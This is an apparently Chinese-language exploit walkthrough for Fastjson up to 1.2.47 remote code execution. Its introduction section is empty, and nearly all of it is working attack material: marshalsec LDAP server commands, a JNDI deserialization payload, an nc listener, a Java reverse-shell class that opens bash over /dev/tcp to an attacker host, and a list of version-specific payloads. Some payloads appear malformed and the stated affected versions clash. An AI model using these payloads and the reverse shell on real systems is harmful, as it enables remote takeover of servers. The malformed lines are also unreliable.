<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>Fastjson &lt;=1.2.47 远程代码执行漏洞</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><p>Fastjson &lt; 1.2.47</p><h2>三、复现过程</h2><p><strong>https://github.com/ianxtianxt/fastjson-1.2.47-RCE-1</strong></p><ul><li>执行：<br />java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://IPvps/#Exploit<br />1.png</li><li>修改反弹ip和端口：<br />vim Exploit.java</li><li>编译生成class：//需要使用jdk1.8，否则会报错<br />javac Exploit.java</li><li>开启http服务：<br />python3 -m http.server 80 或者 python -m SimpleHTTPServer 80</li><li>payload:<br />{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ip:1389/Exploit","autoCommit":true}}}</li><li>开启nc监听反弹：</li></ul><p>nc -lvvp 8888</p><h3>反弹shell poc补充</h3><h4><em>java反弹shell，无法直接使用bash -i &gt;&amp; /dev/tcp/攻击服务器ip/8888 0&gt;&amp;1</em></h4><p>import java.io.BufferedReader;<br />import java.io.InputStream;<br />import java.io.InputStreamReader;<br /><br />public class Exploit{<br />    public Exploit() throws Exception {<br />        Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/攻击服务器ip/888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"});<br />        InputStream is = p.getInputStream();<br />        BufferedReader reader = new BufferedReader(new InputStreamReader(is));<br /><br />        String line;<br />        while((line = reader.readLine()) != null) {<br />            System.out.println(line);<br />        }<br /><br />        p.waitFor();<br />        is.close();<br />        reader.close();<br />        p.destroy();<br />    }<br /><br />    public static void main(String[] args) throws Exception {<br />    }<br />}</p><h3>补充</h3><p><strong>https://github.com/ianxtianxt/Fastjson-1.2.47-rce</strong></p><p>1.2.24<br />{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit", "autoCommit":true}}<br /><br />未知版本(1.2.24-41之间)<br />{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}<br /><br />1.2.41<br />{"@type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}<br /><br />1.2.42<br />{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true};<br /><br />1.2.43<br />{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true]}<br /><br />1.2.45<br />{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://localhost:1099/Exploit"}}<br /><br />1.2.47<br />{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}}}</p></body></html>